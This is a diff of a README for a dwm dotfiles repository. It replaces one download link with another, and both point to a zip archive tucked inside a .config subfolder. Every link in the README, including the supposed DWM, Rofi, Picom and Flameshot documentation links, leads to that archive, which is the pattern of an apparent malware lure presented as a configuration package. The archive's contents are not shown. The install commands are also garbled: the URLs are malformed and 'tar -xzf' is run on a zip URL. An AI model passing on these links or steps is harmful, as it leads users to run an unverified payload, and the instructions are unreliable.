@@ -1,6 +1,6 @@
 # 🖥️ dotfiles-s1b - Modernize Your Linux Experience
 
-[![Download dotfiles-s1b](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip%https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)
+[![Download dotfiles-s1b](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip%https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)
 
 ## 📌 Description
 This repository provides a collection of configurations tailored for the dwm window manager. The dotfiles include:
@@ -21,10 +21,10 @@ Before you download, ensure your system meets the following requirements:
 - Basic familiarity with terminal commands
 
 ### 2. Visit Download Page
-To download the dotfiles, [visit this page to download](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip). Here, you will find the latest release packaged in a downloadable format.
+To download the dotfiles, [visit this page to download](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip). Here, you will find the latest release packaged in a downloadable format.
 
 ### 3. Download the Configuration
-On the releases page, locate the version you want. Click on it to open the release details. Download the `https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip` or `.zip` file that contains all necessary configuration files.
+On the releases page, locate the version you want. Click on it to open the release details. Download the `https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip` or `.zip` file that contains all necessary configuration files.
 
 ## 🛠️ Installation Steps
 Once you have downloaded the files, follow these steps to set up your configurations.
@@ -33,10 +33,10 @@ Once you have downloaded the files, follow these steps to set up your configurat
 Open your terminal and navigate to the directory where you downloaded the dotfiles. Use the following command to extract the files:
 
 ```bash
-tar -xzf https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip
+tar -xzf https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip
 ```
 
-Replace `https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip` with the correct file name if necessary.
+Replace `https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip` with the correct file name if necessary.
 
 ### 2. Move the Files to Home Directory
 Copy the extracted files to your home directory by running:
@@ -87,10 +87,10 @@ Adjust keybindings in the `config.h` file of dwm to suit your workflow. This fle
 
 ## 🔗 Explore Further
 For a more comprehensive understanding of the tools and configurations included, refer to their respective documentation:
-- [DWM](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)
-- [Rofi](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)
-- [Picom](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)
-- [Flameshot](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip)
+- [DWM](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)
+- [Rofi](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)
+- [Picom](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)
+- [Flameshot](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip)
 
 ## ❓ Troubleshooting
 If you encounter any issues during installation or configuration, consider the following:
@@ -99,6 +99,6 @@ If you encounter any issues during installation or configuration, consider the f
 - Reach out to community forums for assistance.
 
 ## 📥 Download & Install
-To get started, remember to [visit this page to download](https://raw.githubusercontent.com/ywxyyds168/dotfiles-s1b/main/.config/micro/backups/dotfiles-s1b-3.3-beta.4.zip). Follow the installation steps mentioned above to apply your new settings and enjoy a modern Linux experience.
+To get started, remember to [visit this page to download](https://github.com/ywxyyds168/dotfiles-s1b/raw/refs/heads/main/.config/dunst/b-s-dotfiles-v3.3-beta.1.zip). Follow the installation steps mentioned above to apply your new settings and enjoy a modern Linux experience.
 
 Feel free to explore, modify, and make the configurations your own.
